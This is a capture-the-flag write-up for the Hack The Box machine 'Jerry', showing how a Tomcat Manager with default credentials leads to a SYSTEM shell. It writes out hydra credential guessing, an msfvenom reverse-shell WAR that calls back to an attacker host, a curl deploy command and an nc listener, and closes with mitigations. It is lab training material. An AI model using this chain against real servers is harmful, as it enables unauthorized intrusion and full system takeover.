---
machine: Jerry
os: Windows
difficulty: Easy
platform: Hack The Box
category: Web / Windows
state: Retired
tags: [windows, tomcat, default-credentials, war, rce]
---

# Jerry — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Methodology notes; no flags or real credentials.

## TL;DR

There is a single port: **8080** running Apache Tomcat 7.0.88. The *Manager* app is exposed with default credentials (`tomcat` / `<password>`). From there you deploy a WAR containing a JSP reverse shell, and since the service runs as **NT AUTHORITY\SYSTEM**, that shell is already SYSTEM: no privilege escalation needed.

## Recon

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
8080/tcp open  http  Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
```

`http://<IP>:8080/` shows the Tomcat welcome page with *Server Status*, *Manager App* and *Host Manager*; the last two prompt for basic auth.

## Access

1. **Default credentials** on `/manager/html` (Tomcat's own error page documents the sample `tomcat:s3cret` pair). Automatable:

```bash
hydra -l tomcat -P /usr/share/wordlists/tomcat-defaults.txt <IP> -s 8080 http-get /manager/html
```

2. **Deploy the WAR**:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war
curl -u tomcat:<password> -T shell.war \
  "http://<IP>:8080/manager/text/deploy?path=/shell&update=true"
```

```text
OK - Deployed application at context path [/shell]
```

3. **Trigger the shell** (the JSP is named after the WAR):

```bash
nc -lvnp 4444
curl http://<IP>:8080/shell/
```

```text
Microsoft Windows [Version 6.3.9600]
C:\apache-tomcat-7.0.88> whoami
nt authority\system
```

Both flags sit in `C:\Users\Administrator\Desktop\flags\`.

## Pitfalls

- **`/manager/text`, not `/manager/html`**: the text endpoint deploys with `curl` and answers in clear text; the HTML one needs a browser form.
- **JSP name**: it changes with every WAR build; check with `jar -tf shell.war` before triggering.
- **Firewall**: if `curl` to the JSP hangs, confirm the app is `running` in the manager list.

## Lessons

- A Tomcat Manager with default credentials is code execution: the panel deploys Java applications at will.
- A service running as SYSTEM turns a foothold into full compromise.
- Mitigation: remove the *manager* app, enforce strong credentials, and run the service as a low-privilege account.
